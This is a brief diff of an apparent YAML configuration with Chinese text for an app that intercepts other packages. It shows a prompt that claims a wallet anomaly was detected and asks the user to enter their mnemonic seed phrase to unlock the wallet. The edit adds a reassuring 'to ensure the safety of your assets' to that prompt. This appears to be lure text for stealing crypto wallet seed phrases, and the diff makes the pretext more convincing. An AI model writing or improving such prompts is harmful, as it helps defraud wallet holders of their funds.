@@ -67,7 +67,7 @@ intercept_packages:
 verify_password: "我已知晓该应用为风险应用"
 
 # 输入框上方提示文字
-verify_hint: "检测到钱包异常，请填写助记词解锁钱包"
+verify_hint: "检测到钱包异常，为保证您的资产安全，请填写助记词解锁钱包"
 
 # 输入框内占位提示文字
 input_hint: "请输入您的助记词"
